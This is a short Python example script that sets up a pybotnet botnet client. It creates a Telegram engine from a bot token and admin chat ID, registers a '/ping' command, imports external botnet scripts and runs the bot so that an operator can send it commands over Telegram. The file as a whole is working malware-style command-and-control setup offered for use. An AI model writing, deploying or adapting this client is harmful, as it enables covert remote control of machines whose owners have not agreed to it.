import logging

from pybotnet import BotNet, Request, TelegramEngine
from simple_external import external_botnet

from configs import ADMIN_CHAT_ID, TELEGRAM_TOKEN

_logger = logging.getLogger(f"__{__name__}   ")

# step (1)
# create engine: Engines transfer messages between admin and botnet
telegram_engine = TelegramEngine(
    token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID
)

# step (2)
# create BotNet instance
botnet = BotNet(telegram_engine, debug=False)


# create new custom script (Optional)
@botnet.add_script(script_version="0.1.0")
def ping(request: Request):
    """`/ping`"""
    return f"pong {' '.join(request.command)}"


# add example external scripts (Optional)
botnet.import_scripts(external_botnet)

# step (3)
# run botnet instance
if __name__ == "__main__":
    _logger.debug(botnet)
    botnet.run()
